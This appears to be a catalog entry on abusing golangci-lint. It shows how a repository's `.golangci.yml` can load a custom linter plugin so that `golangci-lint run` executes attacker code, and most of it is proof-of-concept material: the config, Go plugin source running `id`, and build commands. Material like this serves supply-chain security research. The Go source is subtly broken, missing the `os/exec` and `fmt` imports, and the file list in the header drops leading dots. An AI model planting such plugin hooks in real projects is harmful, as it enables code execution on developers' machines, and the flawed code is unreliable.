---
title: golangci-lint
tags:
- cli
- config-file
- eval-go
references: https://golangci-lint.run/usage/configuration/
files: ['.golangci.yml', '.golangci.yaml', 'golangci.toml', 'golangci.json']
---

`golangci-lint` is a meta-linter tool for Golang that can be configured using a local configuration file. Supported configuration file formats are:

```
.golangci.yml
.golangci.yaml
.golangci.toml
.golangci.json
```

RCE can be achieved through the custom linter support when executing `golangci-lint run`:

`.golangci.yml`

```yaml
linters-settings:
  custom:
    pwn:
      path: pwn.so
```

`pwn.go`

```go
package main

import (
	"os"
	"golang.org/x/tools/go/analysis"
)

var Analyzer = &analysis.Analyzer{
	Name: "pwn",
	Doc:  "pwn",
	Run:  run,
}

func run(pass *analysis.Pass) (any, error) {
	return nil, nil
}

func New(_ any) ([]*analysis.Analyzer, error) {
	out, _ := exec.Command("id").Output()
	fmt.Println(string(out))
	return []*analysis.Analyzer{Analyzer}, nil
}
```

`pwn.so` is build using:

```sh
go mod init main
go mod tidy
go build -buildmode=plugin -o pwn.so pwn.go
```
